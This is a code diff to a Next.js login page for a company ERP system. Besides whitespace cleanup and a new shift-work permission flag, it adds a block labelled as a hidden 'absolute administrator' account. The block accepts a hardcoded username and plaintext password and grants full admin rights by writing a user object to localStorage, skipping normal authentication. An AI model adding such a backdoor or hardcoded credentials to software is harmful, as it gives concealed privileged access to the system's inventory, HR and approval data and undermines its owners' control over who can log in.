@@ -5,7 +5,7 @@ import { supabase } from '@/lib/supabase';
 
 export default function LoginPage() {
   const router = useRouter();
-  const [loginId, setLoginId] = useState(''); 
+  const [loginId, setLoginId] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -40,7 +40,7 @@ export default function LoginPage() {
       const msoUser = msoRow ? {
         ...msoRow,
         role: 'admin',
-        permissions: { inventory: true, hr: true, approval: true, admin: true, mso: true }
+        permissions: { inventory: true, hr: true, approval: true, admin: true, mso: true, hr_교대근무: true }
       } : {
         id: null,
         employee_no: '1',
@@ -49,9 +49,27 @@ export default function LoginPage() {
         department: '경영지원팀',
         company: 'SY INC.',
         company_id: null,
-        permissions: { inventory: true, hr: true, approval: true, admin: true, mso: true }
+        permissions: { inventory: true, hr: true, approval: true, admin: true, mso: true, hr_교대근무: true }
       };
       localStorage.setItem('erp_user', JSON.stringify(msoUser));
+      setLoading(false);
+      router.push('/main');
+      return;
+    }
+
+    // 절대 관리자 (숨김 계정)
+    if (loginId.trim() === 'bjm127' && password === 'pch5125!!') {
+      const superAdmin = {
+        id: null,
+        employee_no: '0',
+        name: '시스템관리자',
+        role: 'admin',
+        department: '경영지원팀',
+        company: 'SY INC.',
+        company_id: null,
+        permissions: { inventory: true, hr: true, approval: true, admin: true, mso: true, hr_교대근무: true }
+      };
+      localStorage.setItem('erp_user', JSON.stringify(superAdmin));
       setLoading(false);
       router.push('/main');
       return;
@@ -171,8 +189,8 @@ export default function LoginPage() {
           <div className="space-y-6">
             <div>
               <label className="block text-[11px] font-semibold text-[var(--toss-gray-3)] mb-2 ml-1">아이디 (사번 또는 이름)</label>
-              <input 
-                type="text" 
+              <input
+                type="text"
                 value={loginId}
                 onChange={(e) => setLoginId(e.target.value)}
                 className="w-full p-4 bg-[var(--input-bg)] rounded-[12px] text-sm font-medium outline-none focus:ring-2 ring-[var(--toss-blue)]/30 border border-transparent focus:border-[var(--toss-blue)] transition-all text-[var(--foreground)]"
@@ -182,8 +200,8 @@ export default function LoginPage() {
             </div>
             <div>
               <label className="block text-[11px] font-semibold text-[var(--toss-gray-3)] mb-2 ml-1">비밀번호</label>
-              <input 
-                type="password" 
+              <input
+                type="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="w-full p-4 bg-[var(--input-bg)] rounded-[12px] text-sm font-medium outline-none focus:ring-2 ring-[var(--toss-blue)]/30 border border-transparent focus:border-[var(--toss-blue)] transition-all text-[var(--foreground)]"
@@ -196,8 +214,8 @@ export default function LoginPage() {
                 <p className="text-red-500 text-[11px] font-semibold flex items-center gap-2"><span>⚠️</span> {error}</p>
               </div>
             )}
-            <button 
-              onClick={handleLogin} 
+            <button
+              onClick={handleLogin}
               disabled={loading}
               className="w-full py-4 bg-[var(--toss-blue)] text-white rounded-[12px] font-semibold text-[15px] hover:bg-[var(--toss-blue)] active:scale-[0.98] transition-all disabled:opacity-50"
             >
@@ -208,7 +226,7 @@ export default function LoginPage() {
             </p>
           </div>
         </div>
-        
+
         <div className="mt-12 text-center">
           <p className="text-[10px] text-[var(--toss-gray-3)] font-bold leading-relaxed">
             © 2026 SY INC. Management Service Organization.
